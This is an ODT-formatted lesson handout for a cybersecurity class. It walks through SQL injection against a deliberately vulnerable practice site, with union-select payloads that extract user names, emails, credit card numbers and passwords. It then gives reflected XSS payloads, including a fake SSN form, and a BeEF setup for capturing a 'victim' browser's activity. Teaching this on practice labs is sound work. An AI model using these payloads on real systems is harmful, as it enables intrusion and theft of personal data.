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automatic-styles>
    <style:style style:name="p21" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c22" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c16" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <text:list-style style:name="L19">
      <text:list-level-style-bullet text:bullet-char="●" text:level="1">
        <style:list-level-properties fo:text-align="start" text:space-before="8mm"/>
      </text:list-level-style-bullet>
    </text:list-style>
    <style:style style:name="c12" style:family="text">
      <style:text-properties fo:font-weight="bold" fo:font-family="Sans"/>
    </style:style>
    <style:style style:name="c13" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c14" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="s15" style:family="section">
      <style:section-properties/>
    </style:style>
    <style:style style:name="c8" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c9" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c10" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p11" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="12pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c4" style:family="text">
      <style:text-properties fo:font-weight="bold" fo:font-family="Sans"/>
    </style:style>
    <style:style style:name="p5" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c6" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c7" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c0" style:family="text">
      <style:text-properties fo:font-family="Sans"/>
    </style:style>
    <style:style style:name="p3" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="13.5pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="p48" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c49" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p51" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="p45" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c46" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c40" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p42" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c43" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p36" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c37" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p38" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c39" style:family="text">
      <style:text-properties fo:font-weight="bold" fo:font-family="Sans"/>
    </style:style>
    <style:style style:name="p32" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="10.5pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c33" style:family="text">
      <style:text-properties fo:font-weight="bold" fo:font-family="Sans"/>
    </style:style>
    <style:style style:name="c34" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p28" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c29" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="p31" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="p24" style:family="paragraph">
      <style:paragraph-properties fo:margin-top="9pt" fo:margin-bottom="9pt"/>
    </style:style>
    <style:style style:name="c25" style:family="text">
      <style:text-properties fo:font-family="Sans" style:text-underline-type="single" style:text-underline-style="solid" fo:color="#0000ff"/>
    </style:style>
    <style:style style:name="c26" style:family="text">
      <style:text-properties fo:font-family="monospace"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="p3"><text:span text:style-name="c4">Week 10 - Supplementary Materials</text:span></text:p>
      <text:p text:style-name="p5">
        <text:a xlink:href="https://github.com/lawfareblog/hacking-cybersecurity/blob/main/week10/Week_10_Homework.md"><text:span text:style-name="c6">Markdown</text:span></text:a><text:span text:style-name="c0"> | </text:span><text:a xlink:href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.pdf"><text:span text:style-name="c7">PDF</text:span></text:a><text:span text:style-name="c0"> | </text:span><text:a xlink:href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.docx"><text:span text:style-name="c8">MS Word DOCX</text:span></text:a><text:span text:style-name="c0"> | </text:span><text:a xlink:href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.odt"><text:span text:style-name="c9">Libre ODT</text:span></text:a><text:span text:style-name="c0"> | </text:span><text:a xlink:href="https://raw.githubusercontent.com/lawfareblog/hacking-cybersecurity/main/week10/Week_10_Homework.html"><text:span text:style-name="c10">HTML</text:span></text:a></text:p>
      <text:p text:style-name="p11"><text:span text:style-name="c12">Introduction</text:span></text:p>
      <text:p text:style-name="p5"><text:span text:style-name="c0">Our attacks this week focus on Web applications and can be tried in any Web browser.</text:span></text:p>
      <text:p text:style-name="p11"><text:span text:style-name="c12">SQL Injection</text:span></text:p>
      <text:p text:style-name="p5">
        <text:a xlink:href="https://en.wikipedia.org/wiki/SQL_injection"><text:span text:style-name="c13">SQL injection</text:span></text:a><text:span text:style-name="c0"> takes advantage of poorly-sanitized inputs to inject code into Web applications and gather information from a database. This kind of attack is exemplified in this </text:span><text:a xlink:href="https://xkcd.com/327/"><text:span text:style-name="c14">xkcd</text:span></text:a><text:span text:style-name="c0"> comic.</text:span></text:p>
      <text:p text:style-name="p5">
        <text:a xlink:href="https://xkcd.com/327/"><text:span>
            <draw:frame draw:name="images/xkcd-sql-injection.png"/>
          </text:span></text:a>
        <text:p text:style-name="p5"><text:span text:style-name="c0">We will use a purposefully-vulnerable Web application for this SQL injection attack.</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p21">
              <text:a xlink:href="http://testphp.vulnweb.com/artists.php"><text:span text:style-name="c22">http://testphp.vulnweb.com/artists.php</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">An example of a profile page for a musical artists is here:</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p24">
              <text:a xlink:href="http://testphp.vulnweb.com/artists.php?artist=2"><text:span text:style-name="c25">http://testphp.vulnweb.com/artists.php?artist=2</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">If we add a hyphen </text:span><text:span text:style-name="c26">-</text:span><text:span text:style-name="c0"> to the URL string after </text:span><text:span text:style-name="c26">?artist=</text:span><text:span text:style-name="c0"> to make the number </text:span><text:span text:style-name="c26">-2</text:span><text:span text:style-name="c0"> we notice that there is a blank page displayed.</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p28">
              <text:a xlink:href="http://testphp.vulnweb.com/artists.php?artist=-2"><text:span text:style-name="c29">http://testphp.vulnweb.com/artists.php?artist=-2</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Additionally, we can throw a SQL error using an apostrophe </text:span><text:span text:style-name="c26">&amp;apos;</text:span><text:span text:style-name="c0"> character.</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p31"><text:span text:style-name="c0">[http://testphp.vulnweb.com/artists.php?artist=-2</text:span><text:span text:style-name="c26">](http://testphp.vulnweb.com/artists.php?artist=-2</text:span><text:span text:style-name="c0">)</text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Now that we know we can break the Web app with simple injection of special characters and negative numbers, let's try to inject SQL commands: </text:span></text:p>
        <text:p text:style-name="p32"><text:span text:style-name="c33">Get All Database Table Names</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()--</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema= database()--</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">You'll see from this command that there is a database table called </text:span><text:span text:style-name="c26">users</text:span><text:span text:style-name="c0"> that we can try to gather information from.</text:span></text:p>
        <text:p text:style-name="p32"><text:span text:style-name="c33">Get All Database Column Names</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(column_name) from information_schema.columns</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(column_name) from information_schema.columns</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">You'll see from this command that there is are columns in the </text:span><text:span text:style-name="c26">users</text:span><text:span text:style-name="c0"> table called </text:span><text:span text:style-name="c26">uname</text:span><text:span text:style-name="c0">,</text:span><text:span text:style-name="c26">cc</text:span><text:span text:style-name="c0">,</text:span><text:span text:style-name="c26">pass</text:span><text:span text:style-name="c0"> and so on. These likely contain sensitive user data.</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get Username of Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(uname) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(uname) from users --</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get Name of Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(name) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(name) from users --</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get Phone Number for Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(phone) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(phone) from users --</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get Email Address for Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(email) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(email) from users --</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get Credit Card Number for Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(cc) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(cc) from users --</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Get User Password for Artist #2</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The SQL command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">union select 1,2,group_concat(pass) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Tricking the Web app to execute the command: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">http://testphp.vulnweb.com/artists.php?artist=-2 union select 1,2,group_concat(pass) from users --</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">This is why only hashes for passwords should be stored in application databases!</text:span></text:p>
        <text:p text:style-name="p11"><text:span text:style-name="c12">Cross-Site Scripting (XSS)</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Cross-Site Scripting (XSS) attacks take advantage of unexpected behavior in a Web app and combine it with social engineering to trick users. It is a major component of </text:span><text:a xlink:href="https://en.wikipedia.org/wiki/Phishing"><text:span text:style-name="c34">phishing</text:span></text:a><text:span text:style-name="c0">.</text:span></text:p>
        <text:p text:style-name="p32"><text:span text:style-name="c33">XSS Reflection Examples</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">We will use a purposefully-vulnerable Web application for this XSS attack. Like SQL injection, we will input markup and code that the application has not properly sanitized to create unexpected behavior. For XSS reflection attacks, we are forcing the Web app to "reflect" the code we send to it in the browser.</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The vulnerable Web app: </text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p36">
              <text:a xlink:href="http://www.insecurelabs.org/task/Rule1"><text:span text:style-name="c37">http://www.insecurelabs.org/task/Rule1</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Try these examples of HTML code: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;h1&gt;This is an XSS Attack Wow!&lt;/h1&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;script&gt;alert('Attacked by Sean')&lt;\/script&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;html&gt;&lt;body&gt;&lt;img src="https://i.imgflip.com/3ualft.jpg"&gt;&lt;/body&gt;&lt;/html&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;iframe width="560" height="315" src="https://www.youtube.com/embed/xm3YgoEiEDc" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;iframe width="1200" height="1200" src="http://www.shinysearch.com/prank/fakegoogle.php?mode=demo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;html&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;button&gt;Click Here!&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">&lt;html&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;SSN# &lt;input&gt;&lt;/input&gt;&lt;br&gt;&lt;br&gt;&lt;button&gt;Submit&lt;/button&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</text:span></text:p>
        <text:p text:style-name="p38"><text:span text:style-name="c39">Beef XSS</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">The </text:span><text:span text:style-name="c26">beef-xss</text:span><text:span text:style-name="c0"> package can be used for more complex attacks that combine XSS on the client/local machine with a remote server to gather credentials. This is very useful for social engineering attacks that </text:span><text:a xlink:href="https://en.wikipedia.org/wiki/Clickjacking"><text:span text:style-name="c40">clickjack</text:span></text:a><text:span text:style-name="c0"> and execute JavaScript spyware that logs user activity.</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Install </text:span><text:span text:style-name="c26">beef-xss</text:span><text:span text:style-name="c0">: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">sudo apt-get install beef-xss</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Run it: </text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c26">sudo beef-xss</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p42"><text:span text:style-name="c0">Set the password on first run (</text:span><text:span text:style-name="c26">b33f</text:span><text:span text:style-name="c0"> is easy to remember).</text:span></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Browse to the Beef XSS Dashboard: * </text:span><text:a xlink:href="http://127.0.0.1:3000/ui/panel"><text:span text:style-name="c43">http://127.0.0.1:3000/ui/panel</text:span></text:a></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">You can also replace 192.168.1.116 with your local IP address, for example: </text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p45">
              <text:a xlink:href="http://192.168.1.116:3000/ui/panel"><text:span text:style-name="c46">http://192.168.1.116:3000/ui/panel</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">This browser session will be the "attacker".</text:span></text:p>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Now browse to this location in another Web browser (e.g., if you're in Firefox open Chrome) or use another machine. This browser session will be the "victim".</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p48">
              <text:a xlink:href="http://127.0.0.1:3000/demos/butcher/index.html"><text:span text:style-name="c49">http://127.0.0.1:3000/demos/butcher/index.html</text:span></text:a></text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="p5"><text:span text:style-name="c0">Click a button on that web page as the "victim".</text:span></text:p>
        <text:list text:style-name="L19">
          <text:list-item>
            <text:p text:style-name="p51"><text:span text:style-name="c0">Now go back to the Beef XSS panel as the "attacker" and look at the </text:span><text:span text:style-name="c26">Logs</text:span><text:span text:style-name="c0"> tab. You should see all traffic from the "victim" Web session (i.e., the user who clicked on the fake butcher website button). </text:span></text:p>
          </text:list-item>
        </text:list>
      </text:p>
    </office:text>
  </office:body>
</office:document-content>
</file>